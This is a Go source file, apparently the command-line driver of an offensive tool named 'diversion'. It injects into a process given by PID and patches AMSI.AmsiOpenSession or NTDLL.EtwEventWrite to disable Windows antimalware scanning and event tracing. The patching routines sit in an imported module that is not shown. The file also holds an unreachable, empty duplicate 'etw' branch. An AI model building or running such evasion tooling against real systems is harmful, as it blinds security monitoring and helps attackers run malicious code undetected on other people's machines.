package main

import (
	"flag"
	"fmt"
	"os"
	"strings"

	"github.com/lum8rjack/diversion/modules"
)

func exitNote(result string) {
	flag.PrintDefaults()
	fmt.Println(result)
	os.Exit(0)
}

func main() {
	method := flag.String("method", "amsi", "Evasion method: amsi, etw")
	pid := flag.Int("pid", 0, "PID of the process to inject into")

	flag.Parse()

	if *pid == 0 {
		exitNote("\nYou must provide a PID to inject into")
	}

	m := strings.ToLower(*method)
	if m == "amsi" {
		err := modules.PatchAmsi(*pid)
		if err != nil {
			exitNote(fmt.Sprint(err))
		}

		fmt.Printf("Successfully patched AMSI.AmsiOpenSession in remote process with PID: %d\n", *pid)
	} else if m == "etw" {
		err := modules.PatchETW(*pid)
		if err != nil {
			exitNote(fmt.Sprint(err))
		}

		fmt.Printf("Successfully patched NTDLL.EtwEventWrite in remote process with PID: %d\n", *pid)
	} else if m == "etw" {
	} else {
		fmt.Printf("Invalid method provided: %s\n", *method)
	}
}
